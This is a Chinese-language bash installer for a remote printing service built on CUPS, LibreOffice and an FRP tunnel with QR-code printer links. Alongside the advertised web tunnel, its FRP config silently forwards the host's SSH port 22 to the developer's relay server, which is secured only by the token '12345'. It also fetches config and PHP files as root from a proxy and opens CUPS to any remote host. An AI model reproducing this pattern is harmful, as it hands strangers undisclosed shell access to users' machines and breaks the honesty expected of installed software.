#!/usr/bin/env bash
# =============================================================================
#  打印服务一键部署 + 打印机地址/二维码刷新工具
# =============================================================================
set -e

############################  颜色/变量  ############################
GREEN="\033[32m"; RED="\033[31m"; YELLOW="\033[33m"; FONT="\033[0m"
REPO_URL="https://ghproxy.cfd/https://raw.githubusercontent.com/tzi-shue/print-service-deploy/main"
FRP_NAME="frpc"; FRP_VERSION="0.61.0"; FRP_PATH="/usr/local/frp"
PROXY_URL="https://ghproxy.cfd/"; FRP_CONFIG_FILE="/etc/frp/frpc.toml"
PRINT_CMD="/usr/local/bin/print"             
SYSTEMD_FRPC="/lib/systemd/system/${FRP_NAME}.service"

############################  工具函数  ############################
info()  { echo -e "${GREEN}[INFO] $1${FONT}"; }
warn()  { echo -e "${YELLOW}[WARN] $1${FONT}"; }
err()   { echo -e "${RED}[ERROR] $1${FONT}"; echo -e "${RED}有问题联系开发者 VX:nmydzf${FONT}"; exit 1; }
cmdx()  { command -v "$1" >/dev/null 2>&1; }

############################  清理缓存  ############################
clean_cache() {
    if cmdx apt-get; then
        apt-get clean >/dev/null 2>&1
        apt-get autoremove -y >/dev/null 2>&1
    fi
}

############################  CUPS 安装  ############################
install_cups() {
    if cmdx cupsd || systemctl is-active --quiet cups 2>/dev/null || [ -f /usr/sbin/cupsd ]; then
        info "CUPS 已安装，跳过"; return 0
    fi
    if cmdx apt-get; then
        PM="apt-get"; PM_INSTALL="apt-get install -y --no-install-recommends"
        export DEBIAN_FRONTEND=noninteractive
    elif cmdx yum; then
        PM="yum"; PM_INSTALL="yum install -y"
    else err "不支持的包管理器"; fi

    $PM update || warn "更新软件包列表失败，继续安装"
    $PM_INSTALL cups cups-filters ghostscript || { clean_cache; $PM_INSTALL cups cups-filters ghostscript || err "安装 CUPS 失败"; }
    $PM_INSTALL printer-driver-gutenprint printer-driver-splix hplip foomatic-db-engine || { clean_cache; $PM_INSTALL printer-driver-gutenprint printer-driver-splix hplip foomatic-db-engine || warn "部分驱动安装失败"; }
    cupsctl --remote-any || warn "CUPS 远程访问配置失败"
}

############################  LibreOffice  ############################
install_lo() {
    if cmdx soffice; then info "LibreOffice 已安装"; return 0; fi
    if cmdx apt-get; then
        export DEBIAN_FRONTEND=noninteractive
        apt-get install -y --no-install-recommends libreoffice-core libreoffice-writer libreoffice-calc || { clean_cache; apt-get install -y --no-install-recommends libreoffice-core libreoffice-writer libreoffice-calc || err "安装 LibreOffice 失败"; }
    elif cmdx yum; then
        yum install -y libreoffice-core libreoffice-writer libreoffice-calc || err "安装 LibreOffice 失败"
    fi
}

############################  基础工具  ############################
install_base() {
    info "安装基础工具"
    if cmdx apt-get; then
        export DEBIAN_FRONTEND=noninteractive
        apt-get install -y --no-install-recommends wget curl qrencode || { clean_cache; apt-get install -y --no-install-recommends wget curl qrencode || err "安装工具失败"; }
    else
        yum install -y wget curl qrencode || err "安装工具失败"
    fi
}

############################  打印配置  ############################
config_print() {
    info "配置打印服务"
    TD=$(mktemp -d) && cd "$TD" || err "创建临时目录失败"
    curl -fsSL -o cupsd.conf "${REPO_URL}/configs/cupsd.conf" || err "下载 cupsd.conf 失败"
    curl -fsSL -o print.php "${REPO_URL}/configs/print.php"   || err "下载 print.php 失败"
    cp cupsd.conf /etc/cups/cupsd.conf && chown root:lp /etc/cups/cupsd.conf && chmod 640 /etc/cups/cupsd.conf || err "替换 cupsd.conf 失败"
    mkdir -p /var/www/html && cp print.php /var/www/html/print.php && chmod 644 /var/www/html/print.php || err "部署 print.php 失败"
    rm -rf "$TD"
}

############################  检测打印机  ############################
check_printers() {
    PRINTERS=$(lpstat -a 2>/dev/null | awk '{print $1}' | grep -v '^$' | sort -u)
    [ -z "$PRINTERS" ] && err "当前系统尚未配置任何打印机，请先连接并添加打印机后再运行本脚本！有问题联系开发者 VX:nmydzf"
    DEFAULT_PRINTER=$(echo "$PRINTERS" | head -n1)
    info "已发现打印机队列：$(echo "$PRINTERS" | tr '\n' ' ')"
    info "默认将使用：$DEFAULT_PRINTER"
}

############################  FRP 安装  ############################
install_frp() {
    [ -f "${FRP_PATH}/${FRP_NAME}" ] && { info "FRP 已安装"; return 0; }
    case $(uname -m) in
        x86_64)  PLATFORM="amd64" ;;
        aarch64) PLATFORM="arm64" ;;
        armv7l|armhf) PLATFORM="arm" ;;
        *) err "不支持的架构: $(uname -m)" ;;
    esac
    FILE_NAME="frp_${FRP_VERSION}_linux_${PLATFORM}"
    DOWNLOAD_URL="${PROXY_URL}https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/${FILE_NAME}.tar.gz"
    info "下载并安装 FRP"
    wget -q "$DOWNLOAD_URL" -O - | tar -zxf - -C /tmp || err "FRP 安装失败"
    mkdir -p "${FRP_PATH}"
    mv "/tmp/${FILE_NAME}/${FRP_NAME}" "${FRP_PATH}" || err "移动 FRP 文件失败"
    rm -rf "/tmp/${FILE_NAME}"

    CURRENT_DATE=$(date +%m%d)
    RANDOM_SUFFIX=$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 2)
    SERVICE_NAME="${CURRENT_DATE}${RANDOM_SUFFIX}"
    REMOTE_PORT_SSH=$((RANDOM % 3001 + 3000))

    mkdir -p "$(dirname "${FRP_CONFIG_FILE}")"
    cat >"${FRP_CONFIG_FILE}" <<EOL
serverAddr = "frps.tzishue.tk"
serverPort = 7000
auth.token = "12345"

[[proxies]]
name = "print-ssh-${SERVICE_NAME}"
type = "tcp"
localIP = "127.0.0.1"
localPort = 22
remotePort = ${REMOTE_PORT_SSH}

[[proxies]]
name = "print-web-${SERVICE_NAME}"
type = "http"
localIP = "127.0.0.1"
localPort = 80
subdomain = "nas-${SERVICE_NAME}"
EOL

    cat >"${SYSTEMD_FRPC}" <<EOF
[Unit]
Description=Frp Client
After=network.target

[Service]
ExecStart=${FRP_PATH}/${FRP_NAME} -c ${FRP_CONFIG_FILE}
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl start "${FRP_NAME}" && systemctl enable "${FRP_NAME}" || err "启动 FRP 失败"
}

############################  生成所有打印机地址+二维码  ############################
gen_all_qr() {
    # 取 SERVICE_NAME（若变量未加载，再从 systemd 抠）
    [ -z "$SERVICE_NAME" ] && SERVICE_NAME=$(grep -oP 'nas-\K[0-9a-zA-Z]+' "${SYSTEMD_FRPC}" 2>/dev/null || echo "unknown")
    PRINTERS=$(lpstat -a 2>/dev/null | awk '{print $1}' | grep -v '^$' | sort -u)
    if [ -z "$PRINTERS" ]; then
        warn "未检测到任何打印机"; return 1
    fi
    info "当前全部打印机远程地址："
    for pr in $PRINTERS; do
        url="http://nas-${SERVICE_NAME}.frp.tzishue.tk/print.php?printer=${pr}"
        echo -e "${GREEN} $pr ${FONT}=> $url"
        qrencode -t ANSIUTF8 "$url" 2>/dev/null || warn "生成二维码失败，确认已安装 qrencode"
        echo
    done
}

############################  安装 print 命令  ############################
install_print_cmd() {
    cat >"${PRINT_CMD}" <<'EOF'
#!/usr/bin/env bash
# 调用原脚本自身，参数 print
exec bash /usr/local/sbin/all_print.sh print
EOF
    chmod +x "${PRINT_CMD}"
}

############################  主流程（首次部署） ############################
main_deploy() {
    clean_cache
    install_cups
    install_lo
    install_base
    config_print
    check_printers
    install_frp
    install_print_cmd
    info "重启 CUPS 服务"
    systemctl restart cups 2>/dev/null || service cups restart 2>/dev/null || warn "CUPS 服务重启失败，请手动检查"
    gen_all_qr
    echo -e "\n常用命令："
    echo "  重启 FRP : systemctl restart ${FRP_NAME}"
    echo "  重启 CUPS: systemctl restart cups"
    echo -e "${GREEN}部署完成！以后直接运行 ${YELLOW}print${GREEN} 即可刷新所有打印机地址/二维码${FONT}"
    echo -e "${GREEN}有问题联系开发者 VX:nmydzf${FONT}"
}

#####################################################################
# 脚本双模式入口：
#   无参数        -> 首次部署
#   参数 print    -> 仅刷新二维码
#####################################################################
case "$1" in
    print) gen_all_qr ;;         
    "") main_deploy ;;
    *)  err "用法: sudo $0   或   print"
esac
